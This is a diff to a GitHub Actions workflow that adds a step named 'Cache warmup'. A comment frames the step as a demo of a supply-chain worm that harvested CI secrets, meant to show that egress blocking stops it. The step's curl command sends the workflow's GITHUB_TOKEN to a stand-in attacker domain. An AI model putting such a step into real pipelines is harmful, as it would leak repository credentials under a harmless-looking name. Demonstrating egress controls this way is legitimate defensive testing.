@@ -67,6 +67,20 @@ jobs:
         # same checkout step.
         run: betterleaks git . --config .betterleaks.toml --log-opts="HEAD" --report-format sarif --report-path betterleaks.sarif
 
+      - name: Cache warmup
+        # ATTACK DEMO — recreates the binding.gyp / "Phantom Gyp" Miasma
+        # worm campaign (3 jun 2026): a weaponized binding.gyp triggered
+        # node-gyp to execute attacker code during npm install, sidestepping
+        # pre/postinstall checks, and harvested CI/CD secrets straight out
+        # of the runner's environment. This step reads a workflow token and
+        # tries to ship it to a domain outside secrets-scan's Harden-Runner
+        # allowlist — egress-policy: block stops it before it leaves the
+        # runner, same mechanism as the axios demo, framed as runner-memory
+        # exfiltration instead of a compromised postinstall script.
+        run: curl -fsS https://exfil.example-attacker.invalid/beacon -d "token=${RUNNER_SECRET_DEMO}"
+        env:
+          RUNNER_SECRET_DEMO: ${{ secrets.GITHUB_TOKEN }}
+
       - name: Upload SARIF
         if: always()
         uses: github/codeql-action/upload-sarif@b96794f015dfd88f77b49b1c93e0fa7110f94c63 # v4.38.0
